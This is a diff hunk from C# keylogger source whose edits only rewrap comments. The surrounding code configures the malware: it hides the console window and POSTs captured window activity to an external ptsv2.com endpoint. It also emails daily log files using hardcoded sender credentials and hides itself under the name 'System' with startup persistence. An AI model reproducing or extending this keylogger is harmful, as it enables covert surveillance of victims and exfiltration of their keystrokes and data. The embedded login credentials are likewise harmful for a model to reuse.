@@ -8,15 +8,18 @@ namespace KeyLogger
         // When the program starts, the console window will be hidden
 
         static string URL = @"https://ptsv2.com/t/kcecq-1587309669/post";
-        // When the current window changes, the program will send post requests. You can see the results here - https://ptsv2.com/t/kcecq-1587309669
+        // When the current window changes, the program will send post requests.
+        // You can see the results here - https://ptsv2.com/t/kcecq-1587309669.
 
         static string FROM_LOGIN = "jebxIY@yandex.by";
         static string FROM_PASS = "RjjiDe";
         static string TO_LOGIN = "malets.d.l.d.l@gmail.com";
-        // To prevent data loss and to organize data, the program once a day and at startup will send a log file to the specified email address
+        // To prevent data loss and to organize data, the program once a day and 
+        // at startup will send a log file to the specified email address.
 
         static bool HARDMODE = true;
-        // At the first start, the program will hide itself at the specified address and will be added to startup
+        // At the first start, the program will hide itself at the specified 
+        // address and will be added to startup.
 
         static string HIDE_NAME = "System";
         // Program name (only in hardmode)
